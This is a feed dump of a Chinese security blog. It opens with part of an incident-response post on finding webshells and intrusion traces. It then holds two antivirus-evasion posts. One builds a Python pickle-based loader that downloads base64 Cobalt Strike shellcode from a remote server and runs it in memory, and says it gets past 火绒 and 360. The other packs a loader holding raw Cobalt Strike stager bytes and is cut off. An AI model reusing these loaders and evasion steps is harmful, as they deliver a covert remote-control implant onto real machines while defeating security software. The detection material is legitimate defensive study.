\;</span><br></pre></td></tr></table></figure></li><li><p>针对个别目录设置可写权限。例如，网站的一些缓存目录就需要给 HTTP 服务有写入权限、discuz x2 的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/</span><br></pre></td></tr></table></figure><p>目录就必须要写入权限。                    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find data -type d -exec chmod 770 &#123;&#125; \;</span><br></pre></td></tr></table></figure></li></ol></li></ol><p><strong>五、文件排查</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</span><br><span class="line">2. 得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件</span><br><span class="line">3. 可以使用find命令来查找，如 find /opt -iname &quot;*&quot; -atime 1 -type f 找出 /opt下一天前访问过的文件</span><br><span class="line">4. 针对可疑文件可以使用 stat 进行创建修改时间。</span><br></pre></td></tr></table></figure><p>webshell-当有文件上传或者其他漏洞时常落地文件<br>比较MD5值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile .\1.jsp</span><br><span class="line">certutil -hashfile .\1.jsp MD5  //查看文件MD５值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -name &quot;*.jsp&quot; |xargs grep &quot;exec(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.php&quot; |xargs grep &quot;eval(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.asp&quot; |xargs grep &quot;execute(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.aspx&quot; |xargs grep &quot;eval(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.php&quot; |xargs grep &quot;base64 decode&quot;</span><br></pre></td></tr></table></figure><p>mimakatz-用于破解域或者计算机密码<br>远控-常见为CS上线样本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">针对CS上线,常使用DNS上线</span><br><span class="line">该方式上线只会发现DNS请求</span><br><span class="line">在流量请求中排查可疑域名</span><br></pre></td></tr></table></figure><p>frp-内网渗透端口转发<br>Powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get-history | format-list -property *   //查看历史命令 </span><br><span class="line">历史命令文件查看:</span><br><span class="line">powershell&gt;=5.0.1   版本过低需安装PSReadline</span><br><span class="line">C:\Users\Adminstrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br></pre></td></tr></table></figure><p>Empire-类似metasploit,针对powershell利用<br>sockscap-端口转发<br>Proxychains-做socks代理(linux自带)<br>Portscan.ps-针对windows端口扫描的powershell脚本<br>PowerShell-AD-Recon 针对windows域管理的各种脚本,域渗透必备</p><p>简单丢入沙箱进行加检查-&gt;&gt;使用干净操作系统–&gt;&gt;网络监测</p><p>样本分析技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CobaltStrike,使用go语言生成后门程序时,会在程序字符串汇中保存go语言的相关组件,记录组件的方式路径+组件名称,如果没有加壳,可直接进行string分析</span><br></pre></td></tr></table></figure><h2 id="Webshell分析"><a href="#Webshell分析" class="headerlink" title="Webshell分析"></a>Webshell分析</h2><p>攻击者在入侵企业网站时，通常要通过各种方式获取 webshell 从而获得企业网站的控制权，然后方便进行之后的入侵行为</p><p>常见攻击方式有：直接文件上传获取 webshell、SQL 注入、文件包含、FTP、Redis 未授权，甚至使用跨站点脚本 (XSS) 作为攻击的一部分，甚至一些比较老旧的方法利用后台数据库备份及恢复获取 webshell、数据库压缩等</p><p>webshell 通用功能包括但不限于 shell 命令执行、代码执行、数据库枚举和文件管理</p><h3 id="Webshell分类"><a href="#Webshell分类" class="headerlink" title="Webshell分类"></a>Webshell分类</h3><p>按协议分类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于 TCP 的 Shell</span><br><span class="line">基于 UDP 的 Shell</span><br><span class="line">基于 ICMP 的 Shell（使用于内网主机主机只允许 ICMP 出入网即只能 ping 通的情况）</span><br><span class="line">基于 ICMP 的 Shell（具有较强的隐蔽性）</span><br></pre></td></tr></table></figure><p>按使用工具分类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Liunx bash 命令反弹 Shell</span><br><span class="line">NC 反弹 Shell</span><br><span class="line">Telnet 反弹 Shell</span><br><span class="line">SSH、iptables、sockets等工具端口转发</span><br><span class="line">AWK 反弹 Shellhttps://blog.csdn.net/weixin_44283446/article/details/115478234</span><br><span class="line">各种编程语言的反弹 shell</span><br></pre></td></tr></table></figure><h3 id="Webshell检测"><a href="#Webshell检测" class="headerlink" title="Webshell检测"></a>Webshell检测</h3><p>webshell 的检测可以分为两个方面一个是主机层面（既根据 webshell 的文件特征和行为特征行为特征进行分析），第二个层面是流量层面（根据webshell 的传输流量分析）</p><p><strong>主机层面</strong></p><p>文件特征分析</p><p>一个 webshell 要执行必然会包含某些危险函数，以 PHP shell 为例，可能存在以下危险函数，存在系统调用的命令执行函数，如eval、system、cmd_shell、assert等，存在系统调用的文件操作函数，如fopen、fwrite、readdir等</p><p>字符串拼接执行操作<br>存在数据库操作函数，调用系统自身的存储过程来连接数据库操作<br>通过自定义加解密函数、利用xor、字符串反转、压缩、截断重组等方法来绕过检测<br>通过关键词匹配脚本文件找出 webshell，D盾之类的webshell查杀工具也是利用这种原理，对源码进行查杀</p><p>行为特征分析</p><p> webshell 在执行函数时这些对于系统调用、系统配置、数据库、文件的操作动作都是可以作为判断依据</p><p>主机可以从以下方法进行分析<br>主机进程分析<br>主机端口调用分析<br>日志应用程序的事件日志<br>系统调用日志（syscall）<br>主机文件监控（系统文件、网站文件、配置文件）</p><p>对搜索到的内容，可以手动查看是否是木马、查看网页生成时间或者上传至一些检测的网站进行检测（<a href="http://www.virscan.org/%E3%80%81https://x.threatbook.cn%E3%80%81https://www.virustotal.com/gui/home/upload%EF%BC%89">http://www.virscan.org/、https://x.threatbook.cn、https://www.virustotal.com/gui/home/upload）</a></p><p>防御方面：Linux 中可以使用 chkrootkit/rkhunter 来定时监测系统，以保证系统的安全</p><p>chkrootkit 主要功能：<br>检测是否被植入后门、木马、rootkit<br>检测系统命令是否正常（避免在入侵检测分析时使用已被替换的命令）<br>检测登录日志<br>使用chkrootkit –n；如果发现有异常，会报出“INFECTED”字样<br> rkhunter 主要功能：<br>系统命令（Binary）检测，包括Md5 校验<br> Rootkit检测<br>本机敏感目录、系统配置、服务及套间异常检测，三方应用版本检测</p><p><strong>流量层面</strong></p><p>流量层面和主机层面相辅相成</p><p>​    基于流量的检测，是无法通过检测构成webshell危险函数的关键词来做检测的，但webshell带有常见写的系统调用、系统配置、数据库、文件的操作动作等，它的行为方式决定了它的数据流量中多带参数具有一些明显的特征，通过匹配行为的流量特征做检测，这也是基于webshell入侵后行为特征进行检测，当然也可以从系统层面webshell入侵行为进行检测</p><p>可以参考之前发的对于菜刀、冰蝎、哥斯拉的分析，我是链接，其流量中即使加密后或多或少也具有一些特征，通过大量数据分析比对发现其流量特征（或者网上的已知特征）后进行阻断拦击</p><p>流量析的好处在于，在 web 访问日志中，是无法抓取 POST 方式的包，也就没法分析 webshell 入侵后的行为，而流量很好的做到了这一点</p><p>还有就是对于常见的内网工具 CS 流量可以通过在流量层面其 IP 端口，心跳包等特征进行检测</p><p>以及 N day 流量分析和 明文敏感信息传输分析</p><p>其他入侵检测方法</p><p>​    动态检测（沙箱）</p><p>​    统计学</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;工具：LiqunShield 、BlueTeam_ABC_123.jar、CobaltStrikeScan.exe、DuckMemoryScan.exe&lt;/p&gt;
&lt;h2 id=&quot;应急响应&quot;&gt;&lt;a href=&quot;#应急响应&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="蓝队" scheme="https://lanxin-1.github.io/blog/categories/%E8%93%9D%E9%98%9F/"/>
    
    
    <category term="应急响应、溯源" scheme="https://lanxin-1.github.io/blog/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%80%81%E6%BA%AF%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>远程加载、分离反序列化免杀</title>
    <link href="https://lanxin-1.github.io/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/"/>
    <id>https://lanxin-1.github.io/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/</id>
    <published>2022-05-15T02:40:25.000Z</published>
    <updated>2022-08-16T06:51:16.832Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python远程加载、分离反序列化免杀"><a href="#Python远程加载、分离反序列化免杀" class="headerlink" title="Python远程加载、分离反序列化免杀"></a>Python远程加载、分离反序列化免杀</h4><p>思路：<br>1.CS生成python x64 shellcode -&gt;payload.py<br>2.将payload.py中shellcode进行base64编码，放至服务器保存为shellcode_bs64.txt，并开启python http服务<br>3.编写shellcode.py，向服务器发送请求读取payload.txt,进行序列化并base64编码<br>4.编写exp.py进行反序列化，加载恶意shellcode<br>5.打包exe，可过火绒、360</p><p>CobaltStrike生成payload</p><img src="/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/1.png" class title="CS生成paylaod"> <p>base64编码，放至服务器</p><img src="/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/2.png" class title="payload上传服务器"> <p>服务器开启python http服务</p><img src="/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/3.png" class title="开启http"> <p>shellcode.py远程加载shellcode_bs64.txt,bs64解码后将shellcode填入加载器，将代码中请求地址改为服务器地址+端口+路径；<br>将带shellcode的加载器序列化再base64编码输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">shellcode = &quot;&quot;&quot;</span><br><span class="line">import ctypes,urllib.request,codecs,base64</span><br><span class="line">shellcode = urllib.request.urlopen(&#x27;http://服务器ip:7777/shellcode_bs64.txt&#x27;).read() //远程加载shellcode</span><br><span class="line">shellcode = base64.b64decode(shellcode)</span><br><span class="line">shellcode =codecs.escape_decode(shellcode)[0]</span><br><span class="line">shellcode = bytearray(shellcode)</span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))</span><br><span class="line">)</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return exec, (shellcode,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line">ret_base64 = base64.b64encode(ret)</span><br><span class="line">print(ret_base64)</span><br></pre></td></tr></table></figure><p>将上一步输出的结果赋值给exp.py中shellcode，将shellcode，base64解码、反序列化、再加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import ctypes</span><br><span class="line">import pickle</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = b&#x27;gASVXgQAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFg/BAAACmltcG9ydCBjdHlwZXMsdXJsbGliLnJlcXVlc3QsY29kZWNzLGJhc2U2NApzaGVsbGNvZGUgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vMTIwLjQ4LjcwLjE1NTo3Nzc3L3NoZWxsY29kZV9iczY0LnR4dCcpLnJlYWQoKQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHNoZWxsY29kZSkKc2hlbGxjb2RlID1jb2RlY3MuZXNjYXBlX2RlY29kZShzaGVsbGNvZGUpWzBdCnNoZWxsY29kZSA9IGJ5dGVhcnJheShzaGVsbGNvZGUpCiMg6K6+572uVmlydHVhbEFsbG9j6L+U5Zue57G75Z6L5Li6Y3R5cGVzLmNfdWludDY0CmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKIyDnlLPor7flhoXlrZgKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQojIOaUvuWFpXNoZWxsY29kZQpidWYgPSAoY3R5cGVzLmNfY2hhciAqIGxlbihzaGVsbGNvZGUpKS5mcm9tX2J1ZmZlcihzaGVsbGNvZGUpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeSgKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGJ1ZiwgCiAgICBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpCikKIyDliJvlu7rkuIDkuKrnur/nqIvku45zaGVsbGNvZGXpmLLmraLkvY3nva7pppblnLDlnYDlvIDlp4vmiafooYwKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQopCiMg562J5b6F5LiK6Z2i5Yib5bu655qE57q/56iL6L+Q6KGM5a6MCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoaGFuZGxlKSxjdHlwZXMuY19pbnQoLTEpKZSFlFKULg==&#x27;</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(shellcode))</span><br></pre></td></tr></table></figure><p>运行exp.py 成功上线</p><img src="/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/4.png" class title="got it"> <p>最后打包exp.py为exe，火绒，360静态扫描可过</p><img src="/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/5.png" class title="static pass by"> <p>运行exp.exe,火绒，360均未拦截，成功上线</p><img src="/blog/2022/05/15/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81%E5%88%86%E7%A6%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/6.png" class title="success"> ]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Python远程加载、分离反序列化免杀&quot;&gt;&lt;a href=&quot;#Python远程加载、分离反序列化免杀&quot; class=&quot;headerlink&quot; title=&quot;Python远程加载、分离反序列化免杀&quot;&gt;&lt;/a&gt;Python远程加载、分离反序列化免杀&lt;/h4&gt;&lt;p&gt;思路</summary>
      
    
    
    
    <category term="免杀" scheme="https://lanxin-1.github.io/blog/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Py打包&amp;分离免杀</title>
    <link href="https://lanxin-1.github.io/blog/2022/05/15/Py%E6%89%93%E5%8C%85&amp;%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/"/>
    <id>https://lanxin-1.github.io/blog/2022/05/15/Py%E6%89%93%E5%8C%85&amp;%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/</id>
    <published>2022-05-14T16:21:31.000Z</published>
    <updated>2022-08-16T06:51:04.350Z</updated>
    
    <content type="html"><![CDATA[<h4 id="py2exe打包"><a href="#py2exe打包" class="headerlink" title="py2exe打包"></a>py2exe打包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># set_up.py</span><br><span class="line">from distutils.core import setup</span><br><span class="line">import py2exe</span><br><span class="line"></span><br><span class="line">setup(console=[&quot;helloworld.py&quot;])</span><br><span class="line"></span><br><span class="line">cmd运行python setup.py py2exe   //打包</span><br></pre></td></tr></table></figure><h4 id="pyinstaller打包"><a href="#pyinstaller打包" class="headerlink" title="pyinstaller打包"></a>pyinstaller打包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F --key uSu1666321 --noconsole py_shellcode.py   --key 随机值 --noconsole 不弹黑窗</span><br></pre></td></tr></table></figure><h5 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h5><p>exe-dll缺失报错</p><p>从 Python 3.3，Windows 在构建 Python 时使用的是 Visual Studio 2010，因此生成后，需要手动将 msvcr100.dll 拷到生成目录下(dist目录)，否则最终的文件运行时可能会报错<br>比如，我在 Win10 下打的包，拷贝到 Win7 上，运行出错：</p><img src="/blog/2022/05/15/Py%E6%89%93%E5%8C%85&%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/1.png" class title="This is an image"> <h4 id="加载器直接加载shellcode"><a href="#加载器直接加载shellcode" class="headerlink" title="加载器直接加载shellcode"></a>加载器直接加载shellcode</h4><p>使用CobaltStrike生成后门</p><img src="/blog/2022/05/15/Py%E6%89%93%E5%8C%85&%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/2.png" class title="This is an image"> <p>输出为python、X64，生成payload</p><img src="/blog/2022/05/15/Py%E6%89%93%E5%8C%85&%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/3.png" class title="This is an image"> <p>将playload和shellcode加载器合成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line"># Time : 2022/08/6 11:19:04</span><br><span class="line"># Author: uSu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">shellcode =  b&quot;&quot;</span><br><span class="line">shellcode += b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60&quot; \</span><br><span class="line">             b&quot;\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c&quot; \</span><br><span class="line">             b&quot;\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot; \</span><br><span class="line">             b&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50&quot; \</span><br><span class="line">             b&quot;\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9&quot; \</span><br><span class="line">             b&quot;\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot; \</span><br><span class="line">             b&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48&quot; \</span><br><span class="line">             b&quot;\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&quot; \</span><br><span class="line">             b&quot;\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56&quot; \</span><br><span class="line">             b&quot;\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31&quot; \</span><br><span class="line">             b&quot;\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00&quot; \</span><br><span class="line">             b&quot;\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1&quot; \</span><br><span class="line">             b&quot;\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5&quot; \</span><br><span class="line">             b&quot;\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31&quot; \</span><br><span class="line">             b&quot;\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c&quot; \</span><br><span class="line">             b&quot;\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x34\x76\x41\x72\x00\xe4\x5e\x78\x3f&quot; \</span><br><span class="line">             b&quot;\xb2\x58\xba\xac\xd2\x49\xec\xdd\xdd\x6b\x99\xd6\x05\x02\x10\xad\x05\x51\xf1\xf5\x67\x95\x72\xc4\x5d&quot; \</span><br><span class="line">             b&quot;\x18\xc3\xfa\xdc\x40\x68\x5d\xae\xa0\xfa\x3c\xa5\xe7\xef\x00\xbd\xe4\x7c\x44\xa6\x7c\xfc\x97\xd1\x8b&quot; \</span><br><span class="line">             b&quot;\xd0\x63\x72\xca\x8b\x11\xa7\x69\x9e\x28\x76\xb6\xad\x37\xd9\x59\x03\xa7\x4b\x00\x55\x73\x65\x72\x2d&quot; \</span><br><span class="line">             b&quot;\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61&quot; \</span><br><span class="line">             b&quot;\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73&quot; \</span><br><span class="line">             b&quot;\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x29\x0d\x0a\x00\x2a&quot; \</span><br><span class="line">             b&quot;\xe8\x65\xe3\xab\xd1\xb0\x0e\x15\x1a\xf5\x0e\x14\x84\xfa\x20\x98\xb8\x06\xcb\x9b\x0e\x5e\x18\xdd\xa0&quot; \</span><br><span class="line">             b&quot;\x03\xaf\x73\x36\xa8\xd6\x6e\xcb\x13\x55\x99\x9b\x9c\x41\xcd\xf2\xe3\x55\xc2\xf5\x46\x39\x03\x19\x04&quot; \</span><br><span class="line">             b&quot;\xd4\x9d\xc9\x21\x8f\xce\x9b\xc7\xa4\x13\x4c\x51\x1d\xa3\xae\xe9\xca\x73\x3c\xbf\x61\x2e\x66\x13\x77&quot; \</span><br><span class="line">             b&quot;\x18\x9f\x77\x7c\x14\x32\x62\xb8\x45\x30\x10\xa4\x16\xc4\x5d\x3d\x37\x3a\x44\x6e\xec\x9b\xc4\xe9\xba&quot; \</span><br><span class="line">             